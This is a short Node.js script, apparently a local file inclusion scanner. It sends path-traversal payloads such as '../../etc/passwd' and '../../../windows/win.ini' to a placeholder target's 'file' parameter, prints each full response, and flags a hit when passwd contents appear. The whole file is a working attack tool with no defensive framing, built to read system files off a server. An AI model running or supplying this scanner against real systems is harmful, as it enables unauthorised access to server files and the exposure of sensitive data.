const axios = require('axios');

const targetUrl = 'http://example.com/vulnerable-endpoint';  // Replace with the target URL

const payloads = [
  '../../etc/passwd',
  '../index.js',
  '../../../windows/win.ini'
];

async function scan() {
  for (const payload of payloads) {
    try {
      const response = await axios.get(`${targetUrl}?file=${payload}`);
      console.log(`Payload: ${payload}`);
      console.log(`Status: ${response.status}`);
      if (response.data.includes('root:x:0:0:')) {
        console.log('Possible LFI vulnerability detected!');
      }
      console.log('Response:', response.data);
      console.log('-------------------------');
    } catch (error) {
      console.log(`Error with payload: ${payload}`);
      console.error(error.message);
    }
  }
}

scan();
